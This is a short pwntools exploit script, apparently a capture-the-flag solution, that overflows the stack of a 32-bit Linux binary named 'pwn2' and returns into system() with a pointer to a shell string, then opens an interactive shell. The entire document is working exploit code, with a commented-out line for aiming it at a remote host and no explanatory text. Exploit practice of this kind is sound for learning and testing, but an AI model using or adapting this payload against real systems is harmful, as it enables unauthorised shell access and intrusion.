from pwn import *
context( arch = 'i386', os = 'linux', log_level = 'debug')
#io = remote('ip',port)
io = process('./pwn2')
elf = ELF('./pwn2')
system = elf.sym['system']
sh = 0x804A23D
payload =cyclic(0x16+4) + p32(system) + p32(0) + p32(sh)
io.sendline(payload)
io.recv()
io.interactive()

